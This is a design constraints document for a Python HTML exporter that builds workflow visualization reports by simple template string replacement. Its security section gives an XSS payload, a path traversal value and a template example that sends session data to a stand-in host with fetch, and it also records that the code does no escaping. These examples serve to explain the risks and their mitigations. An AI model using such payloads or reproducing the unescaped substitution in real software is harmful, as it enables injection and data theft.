# HTML Exporter Constraints

**Module**: Domain - Visualization - HTML Export
**Python Reference**: `src/processors/visualization/html_exporter.py`
**Last Updated**: 2026-02-21

---

## Input Constraints

### WorkflowSession

**Type**: `WorkflowSession` object
**Source**: Generated by `WorkflowTracker` or loaded from JSON

**Required Fields**:
```python
session.session_id: str        # Must be present, never None
session.file_path: str          # Must be present, never None
session.template_name: str      # Must be present
session.start_time: str         # ISO format timestamp
session.processor_states: list  # Can be empty list
session.graph: WorkflowGraph    # Must be present
```

**Optional Fields**:
```python
session.end_time: str | None            # Can be None
session.total_duration_ms: float | None # Can be None
session.config: dict                     # Can be empty dict
session.metadata: dict                   # Can be empty dict
```

**Constraints**:
```python
# session_id must be valid filename-safe string
assert session.session_id.replace('_', '').replace('-', '').isalnum()

# processor_states can be empty but must be list
assert isinstance(session.processor_states, list)
assert all(isinstance(state, ProcessorState) for state in session.processor_states)

# graph must have nodes and edges lists
assert isinstance(session.graph.nodes, list)
assert isinstance(session.graph.edges, list)
```

### ProcessorState

**Type**: `ProcessorState` dataclass
**Required Fields**:
```python
state.name: str                # Processor name
state.order: int               # Execution order (0-indexed)
state.timestamp: str           # ISO format
state.duration_ms: float       # Execution time
state.image_shape: tuple       # (height, width, channels)
state.success: bool            # Execution status
```

**Optional Fields**:
```python
state.gray_image_base64: str | None     # Base64 JPEG
state.colored_image_base64: str | None  # Base64 JPEG
state.metadata: dict                     # Can be empty
state.error_message: str | None         # Error description
```

**Image Constraints**:
```python
# Base64 strings must be valid JPEG encoding
if state.gray_image_base64 is not None:
    assert isinstance(state.gray_image_base64, str)
    assert len(state.gray_image_base64) > 0
    # Typical size: 50 KB - 500 KB after base64 encoding

# At least one image should be present for visualization
# (but not enforced, visualization shows "No image" if both are None)

# Image shape must be valid tuple
assert len(state.image_shape) in [2, 3]  # (h, w) or (h, w, c)
assert all(isinstance(x, int) and x > 0 for x in state.image_shape)
```

### output_path

**Type**: `Path | str`
**Constraints**:
```python
# Must be valid file path
output_path = Path(output_path)

# Parent directory must be creatable
assert output_path.parent is not None

# Extension should be .html
assert output_path.suffix == '.html'  # Recommended, not enforced

# Path length limits (OS-dependent)
assert len(str(output_path)) < 260  # Windows MAX_PATH
```

**Typical Paths**:
```
outputs/visualization/session_xxx.html
outputs/viz/report.html
/tmp/omr_viz.html
```

### template_path

**Type**: `Path | str | None`
**Constraints**:
```python
# If None: uses default template
if template_path is None:
    template_path = Path(__file__).parent / "templates" / "viewer.html"

# If provided: must exist
if template_path is not None:
    template_path = Path(template_path)
    assert template_path.exists(), "Template file not found"
    assert template_path.is_file(), "Template must be a file"
    assert template_path.suffix == '.html'  # Recommended
```

**Template Requirements**:
```html
<!-- Must contain these placeholders: -->
{{ title }}
{{ session_id }}
{{ file_path }}
{{ total_duration_ms }}
{{ session_data }}

<!-- Must load vis.js library (or equivalent): -->
<script src="https://unpkg.com/vis-network@9.1.6/dist/vis-network.min.js"></script>

<!-- Template size: typically 20-30 KB -->
```

### title

**Type**: `str | None`
**Constraints**:
```python
# If None: generated from session_id
if title is None:
    title = f"OMR Workflow Visualization - {session.session_id}"

# Must be HTML-safe (no escaping performed)
# Avoid: <, >, &, ", ' characters
# Recommended: alphanumeric, spaces, hyphens

# Length: no strict limit, but affects browser tab width
assert len(title) < 200  # Reasonable limit
```

### open_browser

**Type**: `bool`
**Default**: `False`
**Constraints**:
```python
# Must be True or False
assert isinstance(open_browser, bool)

# Requires desktop environment (fails on headless servers)
# webbrowser.open() may not work on:
# - Docker containers without X11
# - SSH sessions without X forwarding
# - CI/CD environments
```

**Behavior**:
```python
if open_browser:
    webbrowser.open(f"file://{output_path.absolute()}")
    # Opens in default system browser
    # May fail silently if no browser available
```

### export_json

**Type**: `bool`
**Default**: `True`
**Constraints**:
```python
# Must be True or False
assert isinstance(export_json, bool)

# If True: creates sessions/ subdirectory
# If False: only HTML file created
```

---

## Algorithm Constraints

### Template Substitution

**Method**: Simple string replacement (not a template engine)

**Order**: Sequential (order matters)
```python
html_content = template_content.replace("{{ title }}", title)
html_content = html_content.replace("{{ session_id }}", session.session_id)
html_content = html_content.replace("{{ file_path }}", session.file_path)
html_content = html_content.replace("{{ total_duration_ms }}", duration_str)
html_content = html_content.replace("{{ session_data }}", session_json)
```

**Constraint**: If a value contains a placeholder, it will NOT be re-substituted.

**Example**:
```python
title = "Test {{ session_id }}"
# Result: "Test {{ session_id }}" (not "Test session_xxx")
# Because {{ session_id }} is replaced AFTER {{ title }}
```

**No Escaping**: Values inserted directly without HTML/JS escaping.

**Risk**: If session data contains HTML/JS special characters:
```python
session.file_path = "</script><script>alert('XSS')</script>"
# Would break JavaScript in template!
# Mitigation: JSON encoding escapes most problematic characters
```

**Recommendation for Browser**: Use proper template engine (Handlebars, Mustache) with escaping.

### JSON Serialization

**Method**: `json.dumps(session.to_dict())`

**Constraints**:
```python
# All session data must be JSON-serializable
# No custom objects (numpy arrays converted to lists)
# No datetime objects (converted to ISO strings)
# No Path objects (converted to strings)

# JSON size limits
json_size = len(session_json)
assert json_size < 100_000_000  # 100 MB (practical limit)

# Typical sizes:
# 10 processor states: ~1-5 MB
# 20 processor states: ~2-10 MB
# 50 processor states: ~5-25 MB
```

**JSON Structure Validation**:
```python
session_dict = session.to_dict()

# Required keys
assert "session_id" in session_dict
assert "file_path" in session_dict
assert "processor_states" in session_dict
assert "graph" in session_dict

# processor_states must be list of dicts
assert isinstance(session_dict["processor_states"], list)
for state in session_dict["processor_states"]:
    assert isinstance(state, dict)
    assert "name" in state
    assert "order" in state
    assert "timestamp" in state

# graph must have nodes and edges
assert "nodes" in session_dict["graph"]
assert "edges" in session_dict["graph"]
```

### Duration Formatting

**Input**: `session.total_duration_ms` (float | None)
**Output**: String with 2 decimal places or "N/A"

**Constraint**:
```python
if session.total_duration_ms is not None:
    assert isinstance(session.total_duration_ms, (int, float))
    assert math.isfinite(session.total_duration_ms)
    duration_str = f"{session.total_duration_ms:.2f}"
else:
    duration_str = "N/A"

# Examples:
# 1234.5678 → "1234.57"
# 0.12 → "0.12"
# 1000 → "1000.00"
# None → "N/A"
```

---

## Output Constraints

### HTML File Size

**Typical Sizes**:
```
Template only: ~25 KB
+ Session structure: ~5 KB
+ 10 processor states (with images): ~4 MB
+ 20 processor states: ~8 MB
+ 50 processor states: ~20 MB

Typical output: 500 KB - 10 MB
Maximum practical: ~50 MB (browser may struggle)
```

**Size Breakdown**:
```
HTML template: 25 KB
CSS styles: included in template
JavaScript: included in template
vis.js library: CDN link (not embedded)
Session JSON: 5-50 KB (without images)
Base64 images: 200-500 KB per image
  × 2 (gray + colored)
  × N processor states
  = 400KB * N

Total ≈ 25KB + 400KB * N
```

**Constraints**:
```python
# File system limits
assert html_file_size < 2_000_000_000  # 2 GB (theoretical max)
assert html_file_size < 100_000_000    # 100 MB (practical max)

# Browser limits
# Chrome: Can load files up to ~100 MB
# Firefox: Can load files up to ~150 MB
# Safari: More limited, ~50 MB recommended
```

### File Name Constraints

**Generated Names**:
```python
html_path = output_dir / f"{session.session_id}.html"
json_path = output_dir / "sessions" / f"{session.session_id}.json"
```

**Constraints**:
```python
# session_id must be valid filename
# Allowed characters: a-z, A-Z, 0-9, _, -, .
# Not allowed: / \ : * ? " < > |

# Length limits (OS-dependent)
# Windows: 255 characters (filename)
# Linux: 255 bytes (filename)
# macOS: 255 UTF-8 characters

assert len(session.session_id) < 200  # Safe limit
```

**Typical session_id Format**:
```
session_20240106_123456_abcd1234
session_YYYYMMDD_HHMMSS_<random_hex>

Length: ~40 characters
```

### Directory Creation

**Behavior**: `parents=True, exist_ok=True`

```python
output_path.parent.mkdir(parents=True, exist_ok=True)
# Creates all parent directories
# Does not fail if directory exists
```

**Constraints**:
```python
# Must have write permissions
# Must have sufficient disk space
# Must not exceed path length limits

# Check available space (not currently done)
import shutil
free_space = shutil.disk_usage(output_path.parent).free
assert free_space > estimated_html_size * 2  # Recommended check
```

---

## Performance Constraints

### Time Complexity

**Overall**: O(n + m) where n = processor states, m = template size

**Breakdown**:
```python
# Step 1: Serialize session to JSON
# O(n) where n = total data size
json.dumps(session.to_dict())

# Step 2: Read template
# O(m) where m = template size (~25 KB)
template_content = self.template_path.read_text()

# Step 3: String replacements (5 replacements)
# Each replacement: O(m) where m = current HTML size
# After embedding JSON: m ≈ 25KB + json_size
# Total: O(5 * m) ≈ O(m)

# Step 4: Write file
# O(m) where m = final HTML size
output_path.write_text(html_content)

# Total: O(n + m)
```

**Typical Performance**:
```
Processor States | JSON Size | Time
-----------------|-----------|-------
10               | 2 MB      | 200 ms
20               | 4 MB      | 400 ms
50               | 10 MB     | 1000 ms
100              | 20 MB     | 2000 ms

Dominated by JSON serialization and file I/O
```

### Space Complexity

**Peak Memory**: O(n) where n = HTML file size

**Memory Usage**:
```python
# 1. Template content: ~25 KB
template_content = ...

# 2. Session dict: ~same as JSON size
session_dict = session.to_dict()

# 3. JSON string: ~same as session_dict
session_json = json.dumps(session_dict)

# 4. HTML content: template + JSON + substitutions
# ~25 KB + json_size
html_content = ...

# Peak memory: ~3 × json_size + 100 KB
# Example: 5 MB JSON → ~15 MB peak memory
```

**Constraints**:
```python
# Must fit in available memory
assert peak_memory < available_memory

# Python memory limits
# 32-bit: ~2 GB
# 64-bit: unlimited (OS dependent)

# Typical: 100 MB HTML → ~300 MB peak memory
# Should work on any modern system
```

### Disk I/O

**Writes**: 1-2 files

```python
# HTML file
output_path.write_text(html_content)
# Size: 500 KB - 50 MB

# JSON file (optional)
json_path.write_text(session.to_json())
# Size: 50 KB - 10 MB

# Total writes: 1-2 files, 500 KB - 60 MB
```

**Constraints**:
```python
# Write speed (typical HDD)
# ~50 MB/s sequential write
# 10 MB file → ~200 ms

# Write speed (typical SSD)
# ~500 MB/s sequential write
# 10 MB file → ~20 ms

# Constraint: Must complete in < 10 seconds
```

---

## Browser Constraints

### CDN Dependency

**vis.js Library**: Loaded from CDN

```html
<script src="https://unpkg.com/vis-network@9.1.6/dist/vis-network.min.js"></script>
```

**Constraint**: Requires internet connection to load library.

**Offline Fallback**: Not implemented in default template.

**Recommendation for Browser**:
```javascript
// Option 1: Bundle vis.js with application
import * as vis from 'vis-network';

// Option 2: Self-host vis.js
<script src="/vendor/vis-network.min.js"></script>

// Option 3: Inline vis.js in template (increases size by ~500 KB)
```

### Browser Compatibility

**Required Features**:
- JavaScript ES6 (const, let, arrow functions, template literals)
- DOM API (document.getElementById, addEventListener)
- Canvas API (for vis.js)
- Base64 decoding (built-in, data URIs)
- Blob API (for JSON export)
- URL.createObjectURL (for downloads)

**Minimum Browser Versions**:
```
Chrome: 51+ (June 2016)
Firefox: 54+ (June 2017)
Safari: 10+ (September 2016)
Edge: 79+ (January 2020)
```

**Not Supported**:
```
Internet Explorer (any version)
Old mobile browsers (pre-2016)
```

### Memory Constraints (Browser)

**JavaScript Heap Limits**:
```
Chrome (desktop): 2-4 GB
Firefox (desktop): 2-4 GB
Safari (desktop): 2-4 GB
Chrome (mobile): 512 MB - 2 GB
Safari (mobile): 256 MB - 1 GB
```

**HTML File Size Impact**:
```
5 MB HTML file:
- Loads into memory: ~5 MB
- Parsed DOM: ~10-15 MB
- vis.js graph: ~5-10 MB
- Total memory: ~20-30 MB (safe)

50 MB HTML file:
- Loads into memory: ~50 MB
- Parsed DOM: ~100-150 MB
- vis.js graph: ~50-100 MB
- Total memory: ~200-300 MB (may be slow)

100 MB HTML file:
- May fail to load on mobile
- Very slow on desktop
- Not recommended
```

**Constraint**: Keep HTML < 50 MB for mobile compatibility.

### Image Display Performance

**Base64 Decoding**: Browser native, fast

**Image Rendering**:
```javascript
// Typical 800×600 JPEG (200 KB base64)
img.src = 'data:image/jpeg;base64,' + imageData;

// Decoding time: 10-50 ms (browser-dependent)
// Rendering time: 5-20 ms
// Total: 15-70 ms per image
```

**Constraint**: 50 images × 70 ms = 3.5 seconds max load time.

**Optimization**: Lazy load images (only decode when displayed).

```javascript
// Current: All images embedded and loaded immediately
// Better: Only decode current step's image

function updateUI() {
    const state = sessionData.processor_states[currentStep];
    const imageData = showColored ? state.colored_image_base64 : state.gray_image_base64;
    img.src = 'data:image/jpeg;base64,' + imageData;
    // Only this image is decoded
}
```

---

## Browser Migration Constraints

### File Writing → Download

**Python**: Writes file to disk
**Browser**: Triggers download

**Constraint**: Cannot write to arbitrary paths.

```javascript
// Python behavior (not possible in browser)
output_path.write_text(html_content)

// Browser behavior (download only)
const blob = new Blob([html_content], { type: 'text/html' });
const url = URL.createObjectURL(blob);
const link = document.createElement('a');
link.href = url;
link.download = 'visualization.html';  // Suggested name only
link.click();
// User can save to any location via browser dialog
```

**User Experience**:
- Python: File saved to exact path
- Browser: File saved to Downloads folder (unless user changes)

**Recommendation**: Accept this limitation (standard browser behavior).

### webbrowser.open() → Already Open

**Python**: Opens new browser window/tab
**Browser**: Already running in browser

**Constraint**: N/A (no-op in browser).

```javascript
// Python
webbrowser.open(f"file://{output_path.absolute()}")

// Browser (no equivalent needed)
// Already displaying in current tab

// Optional: Open visualization in new tab
function openInNewTab() {
    const blob = new Blob([html_content], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    window.open(url, '_blank');
}
```

### Template Loading → Bundle or Inline

**Python**: Loads from file system
**Browser**: Three options

**Option 1: Inline Template** (recommended)
```javascript
const VIEWER_TEMPLATE = `
<!DOCTYPE html>
<html>
...entire template...
</html>
`;

// Pros: Works offline, no fetch needed
// Cons: Large bundle size (~25 KB)
```

**Option 2: Fetch Template**
```javascript
const template = await fetch('/templates/viewer.html').then(r => r.text());

// Pros: Keeps bundle small
// Cons: Requires server, async
```

**Option 3: Bundle as Module**
```javascript
import viewerTemplate from './templates/viewer.html?raw';
// Using Vite raw import

// Pros: Works offline, build-time bundling
// Cons: Requires build tool configuration
```

**Recommendation**: Option 1 or 3 depending on build setup.

---

## Security Constraints

### XSS Risk

**Issue**: User data embedded in HTML/JavaScript without escaping.

**Vulnerable Code**:
```python
html_content = template_content.replace("{{ file_path }}", session.file_path)
# If file_path contains: </script><script>alert('XSS')</script>
# Results in code injection!
```

**Mitigation 1**: JSON encoding
```python
session_json = json.dumps(session.to_dict())
# JSON encoding escapes problematic characters:
# " → \"
# < → \u003c
# > → \u003e
```

**Mitigation 2**: Escape user data
```python
import html
safe_file_path = html.escape(session.file_path)
```

**Constraint**: Current implementation relies on JSON encoding for session_data but does NOT escape title, session_id, file_path, total_duration_ms.

**Recommendation for Browser**: Use proper template engine with automatic escaping.

### File Path Traversal

**Issue**: `output_path` could be manipulated to write outside intended directory.

**Example**:
```python
output_path = "../../etc/passwd.html"
# Writes to /etc/passwd.html (if permissions allow)
```

**Mitigation**: Validate output path.
```python
def export(self, session, output_path, ...):
    output_path = Path(output_path).resolve()  # Resolve to absolute
    assert output_path.is_relative_to(safe_base_dir)  # Check bounds
```

**Constraint**: Not currently implemented (assumes trusted input).

**Browser Implication**: Not applicable (downloads go to user-controlled location).

### Template Injection

**Issue**: Custom templates could inject malicious JavaScript.

**Example**:
```html
<!-- Malicious template -->
<script>
    fetch('https://evil.com/steal?data=' + sessionData);
</script>
```

**Mitigation**: Only use trusted templates.

**Constraint**: `template_path` parameter allows arbitrary templates.

**Recommendation**:
- For public deployments: Disallow custom templates
- For internal use: Trust users to provide safe templates

---

## Validation Constraints

### Required Validations (Not Currently Done)

**Input Validation**:
```python
# Validate session
assert isinstance(session, WorkflowSession)
assert session.session_id is not None
assert session.file_path is not None

# Validate paths
assert output_path is not None
if template_path is not None:
    assert Path(template_path).exists()

# Validate types
assert isinstance(title, (str, type(None)))
assert isinstance(open_browser, bool)
```

**Output Validation**:
```python
# Check file was created
assert output_path.exists()
assert output_path.is_file()

# Check file size is reasonable
file_size = output_path.stat().st_size
assert file_size > 10_000  # At least 10 KB (template + minimal data)
assert file_size < 100_000_000  # Less than 100 MB

# Check file is valid HTML (basic check)
html_content = output_path.read_text()
assert html_content.startswith('<!DOCTYPE html>')
assert '</html>' in html_content
```

**Recommendation**: Add validation for production use.

---

## Error Recovery Constraints

### No Rollback on Failure

**Current Behavior**: If export fails mid-way, partial file may exist.

```python
# Potential failure points:
output_path.parent.mkdir(...)  # Could fail (permissions)
template_content = self.template_path.read_text()  # Could fail (missing file)
session_json = json.dumps(...)  # Could fail (non-serializable data)
output_path.write_text(...)  # Could fail (disk full)
webbrowser.open(...)  # Could fail (no browser)

# No cleanup on failure
```

**Recommendation**: Atomic write pattern
```python
# Write to temporary file first
temp_path = output_path.with_suffix('.html.tmp')
temp_path.write_text(html_content)

# Then rename (atomic on most filesystems)
temp_path.rename(output_path)

# On failure, temp file can be cleaned up
```

**Browser Implication**: Downloads are atomic (browser handles this).

---

## Summary of Critical Constraints

| Constraint | Value/Rule | Impact |
|------------|-----------|---------|
| Max HTML file size | 50 MB (recommended) | Browser performance |
| Image encoding | max_width=800, quality=85 | File size optimization |
| Template substitution | Simple string replace | No escaping, XSS risk |
| CDN dependency | vis.js from unpkg.com | Requires internet |
| Browser memory | ~200-300 MB for 50 MB file | Mobile limitations |
| File write | Direct write, no rollback | Partial files on error |
| Path validation | None | Security risk |
| JSON serialization | Must be JSON-safe | No custom objects |
